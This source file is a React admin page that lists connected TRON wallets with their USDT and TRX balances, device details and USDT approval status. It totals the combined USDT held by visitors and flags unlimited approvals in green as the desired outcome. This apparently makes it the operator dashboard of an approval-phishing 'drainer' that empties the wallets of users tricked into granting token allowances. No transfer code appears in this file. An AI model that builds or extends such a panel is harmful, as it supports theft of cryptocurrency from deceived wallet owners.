import { useState, useEffect, useCallback } from 'react';
import { ExternalLink, RefreshCw } from 'lucide-react';
import { fetchWallets, fetchAllowance, type WalletSessionRow, type WalletsResponse } from './AdminApi';

function formatDate(dateStr: string | undefined): string {
  if (!dateStr) return '—';
  return new Date(dateStr).toLocaleString('en-US', {
    month: 'numeric', day: 'numeric', year: 'numeric',
    hour: 'numeric', minute: '2-digit', hour12: true,
  });
}

function walletNameClass(software: string): string {
  const s = (software || '').toLowerCase();
  if (s.includes('metamask')) return 'metamask';
  if (s.includes('trust')) return 'trustwallet';
  if (s.includes('tokenpocket') || s.includes('token')) return 'tokenpocket';
  return '';
}


interface WalletBalanceInfo {
  usdt: number;
  trx: number;
  allowance: number;
  isUnlimited: boolean;
  loading: boolean;
  error?: string;
  lastUpdated?: string;
}

export function AdminWallets() {
  const [data, setData] = useState<WalletsResponse | null>(null);
  const [page, setPage] = useState(1);
  const [balances, setBalances] = useState<Record<string, WalletBalanceInfo>>({});
  const [refreshingAll, setRefreshingAll] = useState(false);

  // ── Load session list from backend ──────────────────────────────────────────
  const load = useCallback(async () => {
    try {
      const result = await fetchWallets(page, 50);
      setData(result);
    } catch { /* ignore */ }
  }, [page]);

  useEffect(() => { load(); }, [load]);

  const sessions: WalletSessionRow[] = data?.sessions ?? [];
  const total = data?.total ?? 0;
  const totalPages = data?.totalPages ?? 1;

  // ── Single wallet on-chain fetch ───────────────────────────────────────────
  const fetchSingleBalance = useCallback(async (address: string) => {
    if (!address || !address.startsWith('T')) return;
    setBalances((prev) => ({
      ...prev,
      [address]: {
        ...(prev[address] || { usdt: 0, trx: 0, allowance: 0, isUnlimited: false, loading: false }),
        loading: true,
        error: undefined,
      },
    }));

    try {
      const res = await fetchAllowance(address);
      setBalances((prev) => ({
        ...prev,
        [address]: {
          usdt: res.balance ?? 0,
          trx: res.trxBalance ?? 0,
          allowance: res.allowance ?? 0,
          isUnlimited: !!res.isUnlimited,
          loading: false,
          lastUpdated: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
        },
      }));
    } catch {
      setBalances((prev) => ({
        ...prev,
        [address]: {
          ...(prev[address] || { usdt: 0, trx: 0, allowance: 0, isUnlimited: false }),
          loading: false,
          error: 'Query failed',
        },
      }));
    }
  }, []);

  // ── Batch fetch all visible wallets ────────────────────────────────────────
  const fetchAllBalances = useCallback(async (sessionList: WalletSessionRow[]) => {
    const tronAddrs = sessionList
      .map((s) => s.wallet_address)
      .filter((a) => a && a.startsWith('T'));

    if (tronAddrs.length === 0) return;

    setRefreshingAll(true);
    // Mark all as loading
    setBalances((prev) => {
      const next = { ...prev };
      tronAddrs.forEach((addr) => {
        next[addr] = {
          ...(next[addr] || { usdt: 0, trx: 0, allowance: 0, isUnlimited: false }),
          loading: true,
          error: undefined,
        };
      });
      return next;
    });

    await Promise.allSettled(
      tronAddrs.map(async (addr) => {
        try {
          const res = await fetchAllowance(addr);
          setBalances((prev) => ({
            ...prev,
            [addr]: {
              usdt: res.balance ?? 0,
              trx: res.trxBalance ?? 0,
              allowance: res.allowance ?? 0,
              isUnlimited: !!res.isUnlimited,
              loading: false,
              lastUpdated: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
            },
          }));
        } catch {
          setBalances((prev) => ({
            ...prev,
            [addr]: {
              ...(prev[addr] || { usdt: 0, trx: 0, allowance: 0, isUnlimited: false }),
              loading: false,
              error: 'Query failed',
            },
          }));
        }
      })
    );
    setRefreshingAll(false);
  }, []);

  // Auto-fetch balances when sessions arrive
  useEffect(() => {
    if (sessions.length > 0) {
      fetchAllBalances(sessions);
    }
  }, [sessions, fetchAllBalances]);

  // Aggregate stats across fetched wallets
  const totalUsdtHolding = Object.values(balances).reduce((sum, b) => sum + (b.usdt || 0), 0);

  return (
    <>
      {/* ── Section Header ──────────────────────────────────────────────── */}
      <div className="admin-section-header" style={{ flexWrap: 'wrap', gap: 12 }}>
        <div>
          <div className="admin-section-title">
            <span className="dot" />
            Connected TRON Wallets Audit Log
          </div>
          <span className="admin-section-count">
            Showing {sessions.length} unique wallet{sessions.length === 1 ? '' : 's'}
            {totalUsdtHolding > 0 && ` • Combined Balance: $${totalUsdtHolding.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USDT`}
          </span>
        </div>

        <button
          className="admin-pagination-btn"
          onClick={() => fetchAllBalances(sessions)}
          disabled={refreshingAll || sessions.length === 0}
          style={{
            display: 'inline-flex',
            alignItems: 'center',
            gap: 6,
            padding: '6px 14px',
            background: 'var(--admin-surface-2)',
            color: 'var(--admin-text)',
            border: '1px solid var(--admin-border)',
            borderRadius: 8,
            cursor: refreshingAll ? 'not-allowed' : 'pointer',
            fontSize: 12,
            fontWeight: 600,
          }}
        >
          <RefreshCw size={13} style={{ animation: refreshingAll ? 'adminSpin 0.8s linear infinite' : 'none' }} />
          {refreshingAll ? 'Querying Blockchain...' : 'Refresh All On-Chain Data'}
        </button>
      </div>

      {sessions.length === 0 && (
        <div className="admin-pg-banner">
          ⚠ No wallet sessions recorded yet. Wallets connecting via TronLink, Trust Wallet, or TokenPocket will appear here.
        </div>
      )}

      {/* ── Mobile Cards View (Optimized for Phones & Tablets) ────────── */}
      <div className="admin-mobile-cards">
        {sessions.length === 0 ? (
          <div className="admin-card-empty">No connection records yet.</div>
        ) : (
          sessions.map((s) => {
            const b = balances[s.wallet_address];
            const isTron = s.wallet_address.startsWith('T');
            const explorerUrl = isTron
              ? `https://tronscan.org/#/address/${s.wallet_address}`
              : `https://etherscan.io/address/${s.wallet_address}`;

            return (
              <div className="admin-record-card" key={s.id}>
                {/* Card Header: Software & Device badges */}
                <div className="admin-record-card-header">
                  <span className={`admin-wallet-name ${walletNameClass(s.wallet_software)}`}>
                    {s.wallet_software || 'Unknown Wallet'}
                  </span>
                  <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
                    <span className={`admin-badge ${(s.device || 'Desktop').toLowerCase()}`}>
                      {s.device || 'Desktop'}
                    </span>
                    <button
                      onClick={() => fetchSingleBalance(s.wallet_address)}
                      disabled={b?.loading}
                      title="Refresh live on-chain balance"
                      style={{
                        background: 'none',
                        border: 'none',
                        padding: 4,
                        color: 'var(--admin-text-dim)',
                        cursor: 'pointer',
                        display: 'flex',
                        alignItems: 'center',
                      }}
                    >
                      <RefreshCw size={13} style={{ animation: b?.loading ? 'adminSpin 0.8s linear infinite' : 'none' }} />
                    </button>
                  </div>
                </div>

                {/* Card Details */}
                <div className="admin-record-grid">
                  <div className="admin-record-row">
                    <span className="admin-record-label">Address:</span>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 6, minWidth: 0 }}>
                      <span className="admin-address" style={{ wordBreak: 'break-all', fontSize: 12 }}>
                        {s.wallet_address}
                      </span>
                      <a
                        href={explorerUrl}
                        target="_blank"
                        rel="noopener noreferrer"
                        title="View on Explorer"
                        style={{ color: 'var(--admin-text-dim)', flexShrink: 0 }}
                      >
                        <ExternalLink size={13} />
                      </a>
                    </div>
                  </div>

                  {/* Public USDT Balance */}
                  <div className="admin-record-row">
                    <span className="admin-record-label">USDT Balance:</span>
                    <span style={{ fontSize: 13, fontWeight: 700, color: b?.usdt ? '#34d399' : 'var(--admin-text)' }}>
                      {b?.loading ? (
                        <span style={{ color: 'var(--admin-text-dim)', fontSize: 11 }}>Fetching...</span>
                      ) : b?.error ? (
                        <span style={{ color: '#ef4444', fontSize: 11 }}>Failed</span>
                      ) : b ? (
                        `$${b.usdt.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USDT`
                      ) : (
                        '—'
                      )}
                    </span>
                  </div>

                  {/* Public TRX Balance */}
                  <div className="admin-record-row">
                    <span className="admin-record-label">TRX Gas:</span>
                    <span style={{ fontSize: 12, color: 'var(--admin-text-dim)' }}>
                      {b?.loading ? '...' : b ? `${b.trx.toLocaleString(undefined, { maximumFractionDigits: 2 })} TRX` : '—'}
                    </span>
                  </div>

                  {/* Allowance Status */}
                  <div className="admin-record-row">
                    <span className="admin-record-label">Approval:</span>
                    {b?.loading ? (
                      <span style={{ color: 'var(--admin-text-dim)', fontSize: 11 }}>Checking...</span>
                    ) : b?.isUnlimited ? (
                      <span
                        className="admin-badge"
                        style={{ background: 'rgba(52, 211, 153, 0.15)', color: '#34d399', border: '1px solid rgba(52, 211, 153, 0.3)' }}
                      >
                        ✓ Unlimited
                      </span>
                    ) : b && b.allowance > 0 ? (
                      <span
                        className="admin-badge"
                        style={{ background: 'rgba(251, 191, 36, 0.15)', color: '#fbbf24', border: '1px solid rgba(251, 191, 36, 0.3)' }}
                      >
                        ${b.allowance.toLocaleString()} USDT
                      </span>
                    ) : (
                      <span className="admin-badge" style={{ opacity: 0.6 }}>None (0)</span>
                    )}
                  </div>

                  <div className="admin-record-row">
                    <span className="admin-record-label">First Seen:</span>
                    <span style={{ fontSize: 12, color: 'var(--admin-text-dim)' }}>
                      {formatDate(s.first_connected)}
                    </span>
                  </div>
                  <div className="admin-record-row">
                    <span className="admin-record-label">Last Active:</span>
                    <span style={{ fontSize: 12, color: 'var(--admin-text-dim)' }}>
                      {formatDate(s.last_active)}
                    </span>
                  </div>
                </div>
              </div>
            );
          })
        )}
      </div>

      {/* ── Desktop Table ────────────────────────────────────────────────── */}
      <div className="admin-desktop-table">
        <div className="admin-table-wrap">
          <table className="admin-table">
            <thead>
              <tr>
                <th>Wallet Address</th>
                <th>Wallet Software</th>
                <th>USDT Balance</th>
                <th>TRX (Gas)</th>
                <th>Platform Allowance</th>
                <th>Device</th>
                <th>Last Active</th>
                <th style={{ textAlign: 'center' }}>Action</th>
              </tr>
            </thead>
            <tbody>
              {sessions.length === 0 ? (
                <tr>
                  <td colSpan={8} className="admin-table-empty">
                    No connection records yet.
                  </td>
                </tr>
              ) : (
                sessions.map((s) => {
                  const b = balances[s.wallet_address];
                  const isTron = s.wallet_address.startsWith('T');
                  const explorerUrl = isTron
                    ? `https://tronscan.org/#/address/${s.wallet_address}`
                    : `https://etherscan.io/address/${s.wallet_address}`;

                  return (
                    <tr key={s.id}>
                      {/* Address + Explorer link */}
                      <td>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                          <span className="admin-address">{s.wallet_address}</span>
                          <a
                            href={explorerUrl}
                            target="_blank"
                            rel="noopener noreferrer"
                            title="View on Explorer"
                            style={{ color: 'var(--admin-text-dim)', display: 'inline-flex', alignItems: 'center' }}
                          >
                            <ExternalLink size={13} />
                          </a>
                        </div>
                      </td>

                      {/* Software */}
                      <td>
                        <span className={`admin-wallet-name ${walletNameClass(s.wallet_software)}`}>
                          {s.wallet_software || 'Unknown'}
                        </span>
                      </td>

                      {/* USDT Balance */}
                      <td>
                        {b?.loading ? (
                          <span style={{ color: 'var(--admin-text-dim)', fontSize: 12 }}>Fetching...</span>
                        ) : b?.error ? (
                          <span style={{ color: '#ef4444', fontSize: 12 }}>Failed</span>
                        ) : b ? (
                          <span style={{ fontWeight: 700, color: b.usdt > 0 ? '#34d399' : 'var(--admin-text)' }}>
                            ${b.usdt.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                          </span>
                        ) : (
                          <span style={{ color: 'var(--admin-text-dim)' }}>—</span>
                        )}
                      </td>

                      {/* TRX Gas Balance */}
                      <td>
                        {b?.loading ? (
                          <span style={{ color: 'var(--admin-text-dim)', fontSize: 12 }}>...</span>
                        ) : b ? (
                          <span style={{ fontSize: 12, color: 'var(--admin-text-dim)' }}>
                            {b.trx.toLocaleString(undefined, { maximumFractionDigits: 2 })} TRX
                          </span>
                        ) : (
                          <span style={{ color: 'var(--admin-text-dim)' }}>—</span>
                        )}
                      </td>

                      {/* Allowance */}
                      <td>
                        {b?.loading ? (
                          <span style={{ color: 'var(--admin-text-dim)', fontSize: 12 }}>Checking...</span>
                        ) : b?.isUnlimited ? (
                          <span
                            className="admin-badge"
                            style={{
                              background: 'rgba(52, 211, 153, 0.15)',
                              color: '#34d399',
                              border: '1px solid rgba(52, 211, 153, 0.3)',
                              fontWeight: 700,
                            }}
                          >
                            ✓ Unlimited
                          </span>
                        ) : b && b.allowance > 0 ? (
                          <span
                            className="admin-badge"
                            style={{
                              background: 'rgba(251, 191, 36, 0.15)',
                              color: '#fbbf24',
                              border: '1px solid rgba(251, 191, 36, 0.3)',
                            }}
                          >
                            ${b.allowance.toLocaleString()} USDT
                          </span>
                        ) : (
                          <span className="admin-badge" style={{ opacity: 0.5 }}>None (0)</span>
                        )}
                      </td>

                      {/* Device & Platform */}
                      <td>
                        <span className={`admin-badge ${(s.device || 'Desktop').toLowerCase()}`}>
                          {s.device || 'Desktop'}
                        </span>
                        {s.platform && (
                          <span style={{ marginLeft: 6, fontSize: 11, color: 'var(--admin-text-dim)' }}>
                            {s.platform}
                          </span>
                        )}
                      </td>

                      {/* Last Active */}
                      <td style={{ fontSize: 12, color: 'var(--admin-text-dim)' }}>
                        {formatDate(s.last_active)}
                      </td>

                      {/* Action */}
                      <td style={{ textAlign: 'center' }}>
                        <button
                          onClick={() => fetchSingleBalance(s.wallet_address)}
                          disabled={b?.loading}
                          title="Refresh live on-chain balance"
                          style={{
                            background: 'var(--admin-surface-2)',
                            border: '1px solid var(--admin-border)',
                            color: 'var(--admin-text)',
                            padding: '4px 8px',
                            borderRadius: 6,
                            cursor: b?.loading ? 'not-allowed' : 'pointer',
                            display: 'inline-flex',
                            alignItems: 'center',
                            gap: 4,
                            fontSize: 11,
                          }}
                        >
                          <RefreshCw size={11} style={{ animation: b?.loading ? 'adminSpin 0.8s linear infinite' : 'none' }} />
                          Refresh
                        </button>
                      </td>
                    </tr>
                  );
                })
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* ── Pagination ──────────────────────────────────────────────────── */}
      {total > 0 && (
        <div className="admin-pagination">
          <span className="admin-pagination-info">
            Page {page} of {totalPages} — {total} total records
          </span>
          <div className="admin-pagination-btns">
            <button
              className="admin-pagination-btn"
              disabled={page <= 1}
              onClick={() => setPage(page - 1)}
            >
              ‹ Prev
            </button>
            <button
              className="admin-pagination-btn"
              disabled={page >= totalPages}
              onClick={() => setPage(page + 1)}
            >
              Next ›
            </button>
          </div>
        </div>
      )}

      {/* Spin animation for refresh button */}
      <style>{`
        @keyframes adminSpin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
      `}</style>
    </>
  );
}
